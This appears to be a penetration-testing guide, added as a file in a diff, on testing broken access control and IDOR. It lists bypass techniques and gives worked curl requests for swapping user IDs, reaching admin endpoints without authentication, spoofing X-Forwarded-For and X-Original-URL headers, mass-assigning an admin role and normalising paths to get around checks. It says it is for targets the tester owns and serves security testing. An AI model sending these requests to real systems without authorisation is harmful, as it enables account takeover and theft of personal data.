@@ -1,0 +1,61 @@
+# HOW TO TEST BROKEN ACCESS CONTROL / IDOR ON A TARGET (2026 expert guide)
+# Every way an attacker tests for access-control bugs - do this on targets you own.
+
+## The N ways to test (all of them)
+1. Authorization via guessed IDs (IDOR): change id, uuid, email, account number and see who answers.
+2. Unauthenticated direct access: hit admin/API endpoints with no session at all.
+3. Role confusion: user A calls user-B capabilities (GET/PUT/DELETE on another tenant).
+4. HTTP method abuse: OPTIONS/TRACE/HEAD/PATCH on protected endpoints; PUT to create.
+5. Header-driven access: X-Forwarded-For, X-Real-IP, X-Original-URL, X-Rewrite-URL -> bypass IP allowlists.
+6. Client-side-only controls: remove the "admin" button? no - call the API the button calls.
+7. Mass assignment / parameter tampering: add role=admin&is_admin=true on signup/update.
+8. Forced browsing: /admin, /admin/users, /api/v1/admin, backup dirs, config files.
+9. Case/path normalization bypass: /ADMIN, /admin/, /./admin, /..;/admin, %2e%2e%2f.
+10. Referer/Origin checks: send requests with Referer: https://admin.internal.
+11. Multi-tenant jumps: /users/123 -> /tenants/456/users/1; subdomain to subdomain.
+12. IDOR in POST/JSON/GraphQL too, not just IDs in URL.
+
+## Step-by-step on target
+1. Map roles: create 2 users + record their IDs/roles (user, admin, org-admin).
+2. Map all API routes: `/api/**` , GraphQL, WebSocket messages.
+3. For each object endpoint, swap ID/userId/accountId across the two accounts; diff responses.
+4. Diff responses for the SAME request while logged as each user (200 vs 403; or 200 with OTHER'S data).
+5. Automated: `ffuf -w ids.txt -u target/api/users/FUZZ -mc 200 -fs <baseline>` on an unauthenticated run.
+6. Then re-run those on admin paths without auth: /api/v1/admin/users/1.
+7. Check the 404-vs-403 signal: apps that 403-but-expose-id are IDORs; apps that 404 hide them.
+8. Try roles on GraphQL (see GraphQL mandatory multiway) and file uploads (stored files belong to user).
+
+## Escalation paths
+- IDOR + ID of victim -> read PII, change password/email (account takeover).
+- Mass assignment on signup -> become admin.
+- Header bypass -> internal admin panels reachable -> RCE sometimes.
+
+## False positives & scope
+- Check the IDs are actually YOUR objects vs genuinely public data.
+- Some apps hide endpoints from UI but allow them intentionally (documented).
+- 401/403 vs data leak on /users/1 while logged out = broken auth, usually valid.
+
+## Tools & automaton
+- Burp Auth Analyzer, Autorize, AuthMatrix, ffuf, HTTPx diffing, Postman collections.
+
+## WORKED EXAMPLES (concrete)
+# A. IDOR account takeover - swap your ID for the victim's:
+#    (logged in as user A with id 101)
+curl -i -b "session=AAA" "https://target.com/api/v1/users/101"
+curl -i -b "session=AAA" "https://target.com/api/v1/users/102"   # if 200 + victim data -> IDOR
+# B. Unauthenticated admin API:
+curl -i "https://target.com/api/v1/admin/config"                # expect 401/403; 200 = broken auth
+curl -i -X POST "https://target.com/api/v1/admin/reset"  -d '{"userId":102}'
+# C. Header allowlist bypass:
+curl -i -H "X-Original-URL: /admin" "https://target.com/"
+curl -i -H "X-Rewrite-URL: /admin/config" "https://target.com/"
+curl -i -H "X-Forwarded-For: 127.0.0.1" -H "X-Real-IP: 127.0.0.1" "https://target.com/restricted"
+# D. Mass assignment on signup:
+curl -i -X POST "https://target.com/signup" -d '{"email":"x@a.com","role":"admin","is_admin":true}'
+# E. Method abuse on protected resource:
+curl -i -X OPTIONS "https://target.com/api/users/1"
+curl -i -X PUT   "https://target.com/api/users/1" -d '{"email":"pwn@a.com"}'
+# F. Path normalization bypass:
+curl -i "https://target.com/..;/admin/"
+curl -i "https://target.com/%2e%2e%2fadmin/"
+curl -i "https://target.com/ADMIN/"
